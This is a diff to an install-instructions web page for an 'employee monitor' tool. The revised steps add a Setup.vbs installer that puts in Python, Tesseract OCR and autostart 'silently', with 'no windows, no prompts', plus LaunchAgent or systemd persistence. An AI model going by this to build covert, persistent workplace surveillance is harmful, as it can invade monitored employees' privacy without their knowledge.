@@ -247,9 +247,9 @@
     .step-num.mac { background:rgba(167,139,250,0.14); border-color:rgba(167,139,250,0.4); color:#c4b5fd; }
     .step-num.lin { background:rgba(249,115,22,0.14);  border-color:rgba(249,115,22,0.4);  color:#fdba74; }
 
-    .step-body { padding-top: 3px; }
+    .step-body { padding-top: 3px; min-width: 0; overflow: hidden; }
     .step-title { font-weight: 700; font-size: 0.92rem; margin-bottom: 3px; color: var(--text); }
-    .step-desc  { color: var(--muted); font-size: 0.84rem; line-height: 1.6; }
+    .step-desc  { color: var(--muted); font-size: 0.84rem; line-height: 1.6; overflow-wrap: break-word; word-break: break-word; }
 
     .step-desc ic {
       display: inline;
@@ -260,7 +260,8 @@
       color: #cbd5e1;
       font-size: 0.81rem;
       font-family: 'Courier New', monospace;
-      white-space: nowrap;
+      white-space: normal;
+      word-break: break-all;
     }
 
     /* ── TIP BLOCK ── */
@@ -355,9 +356,9 @@
 
     /* ── metadata ── */
     const META = {
-      win: { label: 'Windows', icon: '⊞', slug: 'windows', sub: 'Includes deploy_automated.bat' },
-      mac: { label: 'macOS',   icon: '⌘', slug: 'macos',   sub: 'Includes install.command' },
-      lin: { label: 'Linux',   icon: '$', slug: 'linux',    sub: 'Includes install.sh' },
+      win: { label: 'Windows', icon: '⊞', slug: 'windows', sub: 'Double-click Setup.vbs to install' },
+      mac: { label: 'macOS',   icon: '⌘', slug: 'macos',   sub: 'Double-click install.command to install' },
+      lin: { label: 'Linux',   icon: '$', slug: 'linux',    sub: 'Run bash install.sh to install' },
     };
 
     /* ── per-OS steps ── */
@@ -369,19 +370,19 @@
         },
         {
           t: 'Extract the ZIP',
-          d: 'Right-click the file → <em>Extract All</em> and choose a destination folder.'
+          d: 'Right-click the ZIP → <em>Extract All</em> and choose a destination folder.'
         },
         {
-          t: 'Run the automated installer',
-          d: 'Double-click <ic>deploy_automated.bat</ic> inside the extracted folder. It installs Python, Tesseract, and all dependencies automatically — no manual steps required.'
+          t: 'Double-click Setup.vbs',
+          d: 'Your browser opens the setup page immediately. Everything else — Python, packages, Tesseract, autostart — installs silently in the background. No windows, no prompts.'
         },
         {
           t: 'Complete the setup form',
-          d: 'A browser tab opens automatically. Enter the employee\'s name and click Save.'
+          d: 'Fill in the employee name in the browser tab that opened and click Save.'
         },
         {
           t: 'Done',
-          d: 'The monitor starts silently in the background and restarts automatically after every Windows reboot.'
+          d: 'The monitor starts silently in the background and restarts automatically after every Windows reboot. Check <ic>setup_log.txt</ic> in the folder to confirm install finished.'
         }
       ],
       mac: [
@@ -391,19 +392,19 @@
         },
         {
           t: 'Extract the ZIP',
-          d: 'Double-click the ZIP — macOS extracts it to the same folder automatically.'
+          d: 'Double-click the ZIP — macOS extracts it automatically.'
         },
         {
-          t: 'Run the installer',
-          d: 'Double-click <ic>install.command</ic> inside the extracted folder. If macOS blocks it, right-click → <em>Open</em>, then click <em>Open</em> in the dialog. See the tip below if that fails.'
+          t: 'Double-click install.command',
+          d: 'Your browser opens the setup page immediately. Python, packages, Tesseract, and the LaunchAgent autostart all install silently in the background. If macOS asks "Are you sure?", click <em>Open</em>.'
         },
         {
           t: 'Complete the setup form',
-          d: 'A browser tab opens automatically. Enter the employee\'s name and click Save.'
+          d: 'Fill in the employee name in the browser tab that opened and click Save.'
         },
         {
           t: 'Done',
-          d: 'The monitor runs silently and auto-starts after every login via a macOS LaunchAgent.'
+          d: 'The monitor runs silently and auto-starts after every login via macOS LaunchAgent. Check <ic>setup_log.txt</ic> in the folder to confirm install finished.'
         }
       ],
       lin: [
@@ -413,19 +414,19 @@
         },
         {
           t: 'Extract the ZIP',
-          d: 'Run <ic>unzip eyeing-linux.zip -d eyeing</ic> in a terminal, or use your file manager.'
+          d: 'Run <ic>unzip employee-monitor-linux.zip -d employee-monitor</ic> in a terminal, or use your file manager.'
         },
         {
           t: 'Run the installer',
-          d: 'Open a terminal inside the extracted folder and run:<br><br><ic>chmod +x install.sh && ./install.sh</ic><br><br>The script auto-detects your package manager and installs all dependencies.'
+          d: 'Open a terminal in the extracted folder and run: <ic>bash install.sh</ic> — your browser opens the setup page immediately and all dependencies install silently in the background.'
         },
         {
           t: 'Complete the setup form',
-          d: 'A browser tab opens automatically. Enter the employee\'s name and click Save.'
+          d: 'Fill in the employee name in the browser tab that opened and click Save.'
         },
         {
           t: 'Done',
-          d: 'The monitor starts in the background and auto-starts after every reboot via systemd / cron.'
+          d: 'The monitor auto-starts after every reboot via systemd or cron. Check <ic>setup_log.txt</ic> in the folder to confirm install finished.'
         }
       ]
     };
